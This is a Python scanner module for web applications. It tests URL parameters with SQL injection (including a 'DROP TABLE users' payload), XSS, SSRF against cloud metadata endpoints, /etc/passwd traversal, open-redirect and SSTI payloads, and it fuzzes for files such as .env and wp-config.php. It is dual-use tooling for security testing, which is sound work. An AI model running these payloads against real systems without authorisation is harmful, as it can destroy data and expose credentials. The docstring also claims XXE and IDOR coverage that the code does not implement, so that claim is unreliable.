"""
Vulnerability Scanner Module — Web Application Testing
Covers: SQLi, XSS, SSRF, LFI, Open Redirect, IDOR, SSTI, XXE
100% free — uses requests library only.
"""

import requests
import re
import time
import sys, os
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
from config import config

def get_headers():
    h = {"User-Agent": config["user_agent"]}
    if config.get("custom_headers"):
        h.update(config["custom_headers"])
    return h

HEADERS = get_headers()
TIMEOUT = config["timeout"]

# ── SQL Injection ──────────────────────────────────────────────────────────────

SQLI_PAYLOADS_ERROR = [
    "'", '"', "`", "\\",
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' ORDER BY 1--", "1' UNION SELECT NULL--",
    "' AND SLEEP(0)--", "1; DROP TABLE users--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-01756", "quoted string not properly",
    "you have an error in your sql", "unclosed quotation",
    "sqliteexception", "pg_query()", "syntax error",
    "microsoft ole db provider", "supplied argument is not a valid mysql",
    "warning: mysql", "odbc sql server driver",
]

def test_sqli(url: str, params: dict, callback=None) -> list[dict]:
    """Test URL parameters for SQL injection vulnerabilities."""
    findings = []
    for param in params:
        for payload in SQLI_PAYLOADS_ERROR:
            test_params = {**params, param: payload}
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=TIMEOUT, verify=False)
                body = resp.text.lower()
                for err in SQLI_ERRORS:
                    if err in body:
                        finding = {
                            "type": "SQL Injection",
                            "severity": "CRITICAL",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"Error pattern: '{err}'",
                            "cvss": 9.8,
                        }
                        findings.append(finding)
                        if callback:
                            callback(finding)
                        break
                time.sleep(0.2)
            except Exception:
                pass
    return findings


def test_sqli_time_based(url: str, params: dict, callback=None) -> list[dict]:
    """Test for time-based blind SQL injection."""
    findings = []
    time_payloads = [
        ("MySQL", "' AND SLEEP(3)--", 3),
        ("MSSQL", "'; WAITFOR DELAY '0:0:3'--", 3),
        ("PostgreSQL", "'; SELECT pg_sleep(3)--", 3),
    ]
    for param in params:
        for db_type, payload, delay in time_payloads:
            test_params = {**params, param: payload}
            try:
                start = time.time()
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=delay + 5, verify=False)
                elapsed = time.time() - start
                if elapsed >= delay:
                    finding = {
                        "type": "Blind SQL Injection (Time-Based)",
                        "severity": "CRITICAL",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"{db_type}: Response took {elapsed:.2f}s (expected {delay}s delay)",
                        "cvss": 9.8,
                    }
                    findings.append(finding)
                    if callback:
                        callback(finding)
            except Exception:
                pass
    return findings


# ── XSS ───────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '"><svg/onload=alert(1)>',
]

def test_xss(url: str, params: dict, callback=None) -> list[dict]:
    """Test for reflected XSS."""
    findings = []
    marker = "BUGHUNTER_XSS_MARKER"
    for param in params:
        for payload in XSS_PAYLOADS:
            test_payload = payload.replace("alert(1)", f"alert('{marker}')")
            test_params = {**params, param: test_payload}
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=TIMEOUT, verify=False)
                if test_payload in resp.text or marker in resp.text:
                    finding = {
                        "type": "Cross-Site Scripting (XSS)",
                        "severity": "HIGH",
                        "url": url,
                        "parameter": param,
                        "payload": test_payload,
                        "evidence": f"Payload reflected in response body",
                        "cvss": 7.4,
                    }
                    findings.append(finding)
                    if callback:
                        callback(finding)
                    break
            except Exception:
                pass
    return findings


# ── SSRF ──────────────────────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",  # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "file:///etc/passwd",
    "dict://localhost:11211/stat",  # Memcached
]

SSRF_INDICATORS = ["root:x:", "ami-id", "instance-id", "local-ipv4", "hostname", "iam"]

def test_ssrf(url: str, params: dict, callback=None) -> list[dict]:
    """Test for SSRF via common URL parameters."""
    findings = []
    ssrf_params = [p for p in params if any(kw in p.lower() for kw in
                   ["url", "uri", "path", "redirect", "dest", "target",
                    "src", "source", "file", "image", "load", "fetch", "data"])]
    if not ssrf_params:
        ssrf_params = list(params.keys())[:3]  # Test first 3 params anyway

    for param in ssrf_params:
        for payload in SSRF_PAYLOADS:
            test_params = {**params, param: payload}
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=TIMEOUT, verify=False)
                body = resp.text.lower()
                for indicator in SSRF_INDICATORS:
                    if indicator in body:
                        finding = {
                            "type": "Server-Side Request Forgery (SSRF)",
                            "severity": "CRITICAL",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"Response contains: '{indicator}'",
                            "cvss": 9.1,
                        }
                        findings.append(finding)
                        if callback:
                            callback(finding)
                        break
            except Exception:
                pass
    return findings


# ── LFI ───────────────────────────────────────────────────────────────────────

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../../../../../windows/win.ini",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "/etc/passwd",
]

def test_lfi(url: str, params: dict, callback=None) -> list[dict]:
    """Test for Local File Inclusion."""
    findings = []
    for param in params:
        for payload in LFI_PAYLOADS:
            test_params = {**params, param: payload}
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=TIMEOUT, verify=False)
                body = resp.text
                if "root:x:0:0" in body or "[extensions]" in body or "boot loader" in body:
                    finding = {
                        "type": "Local File Inclusion (LFI)",
                        "severity": "CRITICAL",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": "System file content returned in response",
                        "cvss": 9.3,
                    }
                    findings.append(finding)
                    if callback:
                        callback(finding)
                    break
            except Exception:
                pass
    return findings


# ── Open Redirect ─────────────────────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
    "/%09/evil.com",
]

def test_open_redirect(url: str, params: dict, callback=None) -> list[dict]:
    """Test for open redirect vulnerabilities."""
    findings = []
    redirect_params = [p for p in params if any(kw in p.lower() for kw in
                       ["redirect", "url", "next", "goto", "return", "redir",
                        "location", "dest", "destination", "continue", "target"])]
    for param in redirect_params:
        for payload in REDIRECT_PAYLOADS:
            test_params = {**params, param: payload}
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=TIMEOUT, verify=False, allow_redirects=False)
                loc = resp.headers.get("Location", "")
                if "evil.com" in loc:
                    finding = {
                        "type": "Open Redirect",
                        "severity": "MEDIUM",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Redirects to: {loc}",
                        "cvss": 6.1,
                    }
                    findings.append(finding)
                    if callback:
                        callback(finding)
            except Exception:
                pass
    return findings


# ── SSTI ──────────────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
]

def test_ssti(url: str, params: dict, callback=None) -> list[dict]:
    """Test for Server-Side Template Injection."""
    findings = []
    for param in params:
        for payload, expected in SSTI_PAYLOADS:
            test_params = {**params, param: payload}
            try:
                resp = requests.get(url, params=test_params, headers=HEADERS,
                                    timeout=TIMEOUT, verify=False)
                if expected in resp.text:
                    finding = {
                        "type": "Server-Side Template Injection (SSTI)",
                        "severity": "CRITICAL",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Template expression evaluated: {payload} → {expected}",
                        "cvss": 9.8,
                    }
                    findings.append(finding)
                    if callback:
                        callback(finding)
                    break
            except Exception:
                pass
    return findings


# ── Directory Fuzzer ──────────────────────────────────────────────────────────

COMMON_PATHS = [
    "admin", "admin/", "administrator", "login", "wp-admin",
    ".git/", ".env", ".htaccess", "config.php", "web.config",
    "backup", "backup.zip", "backup.sql", "backup.tar.gz",
    "api/", "api/v1/", "api/v2/", "graphql", "swagger.json",
    "openapi.json", "actuator", "actuator/env", "actuator/health",
    "phpinfo.php", "info.php", "test.php", "debug.php",
    "robots.txt", "sitemap.xml", ".well-known/",
    "server-status", "server-info", "_darcs/", "CVS/",
    "wp-config.php", "config.yml", "config.yaml", "settings.py",
    "settings.php", "database.php", "db.php", "conn.php",
    "upload", "uploads", "files", "images", "static",
    "console", "shell", "cmd", "exec", "phpmyadmin",
]

def dir_fuzz(base_url: str, callback=None, extra_paths: list = None) -> list[dict]:
    """Fuzz for common directories and files."""
    if not base_url.startswith("http"):
        base_url = f"https://{base_url}"
    base_url = base_url.rstrip("/")

    paths = COMMON_PATHS + (extra_paths or [])
    found = []

    for path in paths:
        url = f"{base_url}/{path}"
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT,
                                verify=False, allow_redirects=False)
            status = resp.status_code
            if status in [200, 201, 301, 302, 403]:
                result = {
                    "url": url,
                    "status": status,
                    "size": len(resp.content),
                    "interesting": status == 200 or (status == 403 and "admin" in path.lower()),
                }
                found.append(result)
                if callback:
                    callback(result)
        except Exception:
            pass

    return found
